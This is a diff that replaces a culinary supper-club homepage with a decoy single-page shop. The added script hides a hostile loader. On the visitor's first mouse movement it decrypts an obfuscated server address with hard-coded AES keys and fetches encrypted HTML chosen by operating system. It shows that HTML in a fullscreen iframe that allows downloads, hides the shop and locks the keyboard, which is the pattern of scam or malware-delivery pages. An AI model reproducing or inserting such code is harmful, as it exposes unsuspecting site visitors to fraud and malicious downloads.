@@ -1,355 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google Tag Manager / GA4 -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Twilight Gastronomy, Supper Club Curation & Culinary Storytelling | DinnerChapter</title>
-    <meta name="description" content="Explore elevated multi-course dinner architecture, flavor balancing chemistry, seasonal menus, and intimate supper club culture with DinnerChapter.">
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;0,9..144,800;1,9..144,400&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400;1,600&display=swap" rel="stylesheet">
-</head>
-<body data-theme="light">
-    <div class="reading-progress-bar" id="readingProgress"></div>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-    <!-- Header -->
-    <header class="site-header">
-        <div class="container header-container">
-            <a href="index.html" class="brand-logo">
-                <span class="brand-crest">🕯️</span>
-                <div class="brand-text">
-                    <span class="brand-name">DinnerChapter</span>
-                    <span class="brand-sub">Twilight Gastronomy & Supper Club</span>
-                </div>
-            </a>
-            <nav class="desktop-nav">
-                <a href="index.html" class="nav-link active">Home</a>
-                <a href="about.html" class="nav-link ">Our Philosophy</a>
-                <a href="blog.html" class="nav-link ">Culinary Journal</a>
-                <a href="contact.html" class="nav-link ">Supper Desk & Inquiries</a>
-            </nav>
-            <div class="header-actions">
-                <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle Theme">
-                    <span class="theme-icon">🌓</span>
-                </button>
-                <a href="contact.html" class="btn btn-primary btn-sm">Join Supper Club</a>
-                <button class="mobile-menu-btn" id="menuToggle" aria-label="Open Navigation Menu">
-                    <span></span><span></span><span></span>
-                </button>
-            </div>
-        </div>
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <div class="mobile-drawer" id="mobileDrawer">
-        <div class="mobile-drawer-header">
-            <span class="brand-name">DinnerChapter</span>
-            <button class="mobile-drawer-close" id="drawerClose">&times;</button>
-        </div>
-        <nav class="mobile-nav-list">
-            <a href="index.html" class="mobile-nav-link active">Home</a>
-            <a href="about.html" class="mobile-nav-link ">Our Philosophy</a>
-            <a href="blog.html" class="mobile-nav-link ">Culinary Journal</a>
-            <a href="contact.html" class="mobile-nav-link ">Supper Desk & Inquiries</a>
-        </nav>
-    </div>
-
-    <main class="page-main-wrap">
-
-    <!-- Hero Section -->
-    <section class="hero-dinner-section">
-        <div class="container hero-grid">
-            <div class="hero-text-content">
-                <span class="hero-tag">✨ The Twilight Gastronomy Collective</span>
-                <h1 class="hero-title">Every Memorable Evening Is a Delicious Story Waiting to Unfold.</h1>
-                <p class="hero-subtitle">
-                    DinnerChapter is an independent culinary storytelling atelier and modern supper club. We deconstruct the science of the evening meal—from Maillard crusting thermodynamics to velvety emulsion sauces and communal table rituals.
-                </p>
-                <div class="hero-cta-group">
-                    <a href="#sequencer" class="btn btn-primary">Explore 5-Course Sequencer</a>
-                    <a href="about.html" class="btn btn-outline">Our Culinary Philosophy</a>
-                </div>
-            </div>
-            <div class="hero-image-wrap">
-                <img src="images/hero-dinner-table-ambiance.jpg" alt="Warm candlelit dining table ready for multi-course evening dinner" class="hero-main-img">
-                <div class="hero-floating-badge">
-                    <span class="badge-icon">🍽️</span>
-                    <div>
-                        <div class="badge-title">5-Course Narrative</div>
-                        <div class="badge-sub">Curated seasonal harmony</div>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
 
-    <!-- 5-Course Dinner Chapter Sequencer (Interactive) -->
-    <section class="section-sequencer" id="sequencer">
-        <div class="container">
-            <div class="section-header-center">
-                <span class="section-subtitle">Interactive Gastronomy</span>
-                <h2>The 5-Course Dinner Chapter Sequencer</h2>
-                <p>A well-orchestrated dinner is composed like a classic symphonic movement. Select each chapter to explore the sensory progression, cooking science, and palate pacing.</p>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-            <div class="sequencer-tabs">
-                <button class="course-tab-btn active" data-course="amuse">01. Amuse-Bouche</button>
-                <button class="course-tab-btn" data-course="harvest">02. Earth Harvest</button>
-                <button class="course-tab-btn" data-course="entree">03. Searing Entrée</button>
-                <button class="course-tab-btn" data-course="cleanser">04. Intermezzo Cleanser</button>
-                <button class="course-tab-btn" data-course="dessert">05. Confection & Elixir</button>
-            </div>
-
-            <div class="course-detail-panel" id="coursePanel">
-                <div class="course-text-col">
-                    <span class="course-number">01</span>
-                    <h3 class="course-name">Amuse-Bouche & Aromatic Awakening</h3>
-                    <p>A single, high-intensity bite engineered to stimulate salivary amylase and awaken the gustatory papillae before the dinner unfolds.</p>
-                    <ul class="course-science-list">
-                        <li>Acidic brightness activates trigeminal nerve receptors</li>
-                        <li>Delicate herb essences prime the olfactory cortex</li>
-                        <li>Micro-portioning ensures palate receptivity without early satiety</li>
-                    </ul>
-                </div>
-                <div class="course-img-col">
-                    <img src="images/amuse-bouche-appetizer-course.jpg" alt="Gourmet amuse-bouche tasting bite with botanical garnish" class="course-img">
-                </div>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <!-- Flavor Architecture Matrix -->
-    <section class="section-flavor-matrix">
-        <div class="container">
-            <div class="section-header-center">
-                <span class="section-subtitle">Sensory Science</span>
-                <h2>The DinnerChapter Flavor Architecture Matrix</h2>
-                <p>Mastering the balance of the five fundamental taste sensations creates multidimensional resonance on the human palate.</p>
-            </div>
-
-            <div class="flavor-grid">
-                <div class="flavor-card">
-                    <span class="flavor-icon">🧂</span>
-                    <h3 class="flavor-title">Salt (Ionic Resonance)</h3>
-                    <p class="flavor-desc">Suppresses bitterness, unmasks hidden aromatic esters, and regulates moisture retention in cellular muscle fibers.</p>
-                    <span class="flavor-pairing-tag">Key: Flaky Fleur de Sel</span>
-                </div>
-                <div class="flavor-card">
-                    <span class="flavor-icon">🍋</span>
-                    <h3 class="flavor-title">Acid (Palate Contrast)</h3>
-                    <p class="flavor-desc">Cuts through heavy lipid coatings, balances richness, and triggers salivary flow to reset taste receptors between bites.</p>
-                    <span class="flavor-pairing-tag">Key: Fermented Verjus & Citrus</span>
-                </div>
-                <div class="flavor-card">
-                    <span class="flavor-icon">🧈</span>
-                    <h3 class="flavor-title">Fat (Aroma Carrier)</h3>
-                    <p class="flavor-desc">Dissolves fat-soluble flavor compounds and coats the tongue to prolong the lingering culinary finish of each bite.</p>
-                    <span class="flavor-pairing-tag">Key: Cultured Butter & Olive Oil</span>
-                </div>
-                <div class="flavor-card">
-                    <span class="flavor-icon">🔥</span>
-                    <h3 class="flavor-title">Heat (Thermal Energy)</h3>
-                    <p class="flavor-desc">Drives Maillard reactions, renders connective collagens, and volatilizes delicate aromatic oils into the air.</p>
-                    <span class="flavor-pairing-tag">Key: Radiant Cast Iron Heat</span>
-                </div>
-                <div class="flavor-card">
-                    <span class="flavor-icon">🍄</span>
-                    <h3 class="flavor-title">Umami (Savory Depth)</h3>
-                    <p class="flavor-desc">Glutamates and nucleotides trigger deep satisfaction, magnifying savory satisfaction across roasted dinner courses.</p>
-                    <span class="flavor-pairing-tag">Key: Roasted Mushrooms & Stocks</span>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
 
-    <!-- 5 Pillars of Memorable Dining -->
-    <section class="section-pillars">
-        <div class="container">
-            <div class="section-header-center">
-                <span class="section-subtitle">Hospitality Principles</span>
-                <h2>The 5 Pillars of Elevated Supper Gatherings</h2>
-                <p>A truly transformative dinner transcends mere food—it is an immersive sensory environment shaped by thoughtful details.</p>
-            </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-            <div class="pillars-grid">
-                <div class="pillar-item">
-                    <span class="pillar-num">01</span>
-                    <div class="pillar-content">
-                        <h4>Candlelight & Twilight Ambiance</h4>
-                        <p>Low-color-temperature lighting (2200K–2700K) softens facial angles, reduces cortisol, and invites unhurried intimate conversations.</p>
-                    </div>
-                </div>
-                <div class="pillar-item">
-                    <span class="pillar-num">02</span>
-                    <div class="pillar-content">
-                        <h4>Terroir-Synced Seasonality</h4>
-                        <p>Harvesting ingredients at peak ripeness delivers natural sugar-acid balances that require minimal artificial enhancement in the kitchen.</p>
-                    </div>
-                </div>
-                <div class="pillar-item">
-                    <span class="pillar-num">03</span>
-                    <div class="pillar-content">
-                        <h4>The Art of the Shared Table</h4>
-                        <p>Communal platters and intentional seating arrangements break social barriers, transforming strangers into lifelong companions.</p>
-                    </div>
-                </div>
-                <div class="pillar-item">
-                    <span class="pillar-num">04</span>
-                    <div class="pillar-content">
-                        <h4>Sauce Architecture & Searing</h4>
-                        <p>Every plate features a harmonious textural contrast: a crisp caramelized exterior supported by a velvety emulsion or reduction sauce.</p>
-                    </div>
-                </div>
-                <div class="pillar-item">
-                    <span class="pillar-num">05</span>
-                    <div class="pillar-content">
-                        <h4>Zero-Waste Kitchen Mise-en-Place</h4>
-                        <p>Vegetable trims become golden roasted broths, herb stems become infused oils, and day-old sourdough transforms into crisp pangrattato.</p>
-                    </div>
-                </div>
-                <div class="pillar-item">
-                    <span class="pillar-num">06</span>
-                    <div class="pillar-content">
-                        <h4>Reflective Digestif Ritual</h4>
-                        <p>Closing the meal with warm botanical herbal elixirs supports digestive comfort and provides a relaxed space for evening reflection.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Seasonal Menu Harmonizer Calendar -->
-    <section class="section-seasonality">
-        <div class="container">
-            <div class="section-header-center">
-                <span class="section-subtitle">Farm-to-Table Rhythm</span>
-                <h2>Seasonal Menu Harmonizer Calendar</h2>
-                <p>Aligning dinner menus with the biological calendar ensures peak flavor density and environmental sustainability.</p>
-            </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-            <div class="season-grid">
-                <div class="season-card">
-                    <span class="season-badge">Spring Equinox</span>
-                    <h4>Awakening & Green Herbs</h4>
-                    <ul class="season-list">
-                        <li>Morel mushrooms & wild ramps</li>
-                        <li>Tender asparagus & garden peas</li>
-                        <li>Chive blossom botanical vinaigrettes</li>
-                        <li>Velvety tarragon emulsion sauces</li>
-                    </ul>
-                </div>
-                <div class="season-card">
-                    <span class="season-badge">Summer Solstice</span>
-                    <h4>Vibrant Sun & Sun-Ripened Bounty</h4>
-                    <ul class="season-list">
-                        <li>Heirloom tomatoes & fresh basil</li>
-                        <li>Charred sweet corn & grilled summer squashes</li>
-                        <li>Chilled cucumber botanical gazpacho</li>
-                        <li>Roasted stone fruit & thyme reductions</li>
-                    </ul>
-                </div>
-                <div class="season-card">
-                    <span class="season-badge">Autumn Harvest</span>
-                    <h4>Earth, Smoke & Roots</h4>
-                    <ul class="season-list">
-                        <li>Roasted kabocha squash & parsnips</li>
-                        <li>Chanterelle mushrooms & sage brown butter</li>
-                        <li>Braised heritage root vegetable ragout</li>
-                        <li>Spiced orchard apple & rosemary reductions</li>
-                    </ul>
-                </div>
-                <div class="season-card">
-                    <span class="season-badge">Winter Solstice</span>
-                    <h4>Rich Simmering & Hearth Warmth</h4>
-                    <ul class="season-list">
-                        <li>Slow-braised savory lentil & winter greens</li>
-                        <li>Caramelized shallot & garlic pan sauces</li>
-                        <li>Velvety celery root & chestnut purees</li>
-                        <li>Dark roasted cocoa & juniper digestif teas</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19PP9rw5bqnzSMZaqZhEB/iwqE0KjDEy6hSKaB+5VK5z6gGn4EjFVR7";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- Supper Club Invitation CTA -->
-    <section class="section-supper-cta">
-        <div class="container cta-box">
-            <h2>Take Your Seat at the Dinner Table</h2>
-            <p>Whether you are looking to host an unforgettable multi-course gathering or consult with our culinary team on menu design, we welcome your inquiry.</p>
-            <a href="contact.html" class="btn btn-primary" style="background-color: var(--brand-gold); color: #111518;">Reserve a Consultation</a>
-        </div>
-    </section>
-    
-    </main>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    <!-- Footer -->
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-top">
-                <div class="footer-brand-col">
-                    <div class="brand-logo">
-                        <span class="brand-crest">🕯️</span>
-                        <div class="brand-text">
-                            <span class="brand-name">DinnerChapter</span>
-                            <span class="brand-sub">Twilight Gastronomy</span>
-                        </div>
-                    </div>
-                    <p>An independent culinary storytelling studio and modern supper club dedicated to seasonal multi-course dinner curation, flavor chemistry, and the timeless art of the shared evening table.</p>
-                    <div class="footer-coordinates">
-                        <p>📍 450 West 14th Street, New York, NY 10014, United States</p>
-                        <p>📞 +1-888-924-2783</p>
-                        <p>✉️ concierge@dinnerchapter.com</p>
-                    </div>
-                </div>
-                <div class="footer-nav-col">
-                    <h4>Supper Chapters</h4>
-                    <ul>
-                        <li><a href="index.html">5-Course Sequencer</a></li>
-                        <li><a href="about.html">Chef Manifesto</a></li>
-                        <li><a href="blog.html">Culinary Journal</a></li>
-                        <li><a href="contact.html">Supper Club Table</a></li>
-                    </ul>
-                </div>
-                <div class="footer-nav-col">
-                    <h4>Culinary Science</h4>
-                    <ul>
-                        <li><a href="blog/the-science-of-the-maillard-reaction-protein-pyrolysis-flavor-compounds-and-steak-searing-mechanics.html">Maillard Reaction Dynamics</a></li>
-                        <li><a href="blog/the-art-of-the-modern-supper-club-curating-multi-course-narratives-tablescape-design-and-guest-dynamics.html">Supper Club Curation</a></li>
-                        <li><a href="blog/emulsion-chemistry-in-evening-sauces-hollandaise-beurre-blanc-and-velvety-reductions-demystified.html">Sauce Emulsion Physics</a></li>
-                        <li><a href="blog/balancing-the-five-flavor-profiles-salt-acid-fat-heat-and-umami-in-complex-dinner-orchestration.html">5-Flavor Matrix Guide</a></li>
-                    </ul>
-                </div>
-                <div class="footer-nav-col">
-                    <h4>Hospitality & Legal</h4>
-                    <ul>
-                        <li><a href="privacy.html">Privacy Policy</a></li>
-                        <li><a href="terms.html">Terms of Service</a></li>
-                        <li><a href="disclaimer.html">Culinary Disclaimer</a></li>
-                        <li><a href="cookies.html">Cookie Policy</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; <?php echo date('Y'); ?> DinnerChapter Atelier LLC. All rights reserved. Elevated evening gastronomy & storytelling.</p>
-                <div class="footer-legal-links">
-                    <a href="privacy.html">Privacy</a>
-                    <a href="terms.html">Terms</a>
-                    <a href="disclaimer.html">Disclaimer</a>
-                    <a href="cookies.html">Cookies</a>
-                </div>
-            </div>
-        </div>
-    </footer>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-    <script src="script.js"></script>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
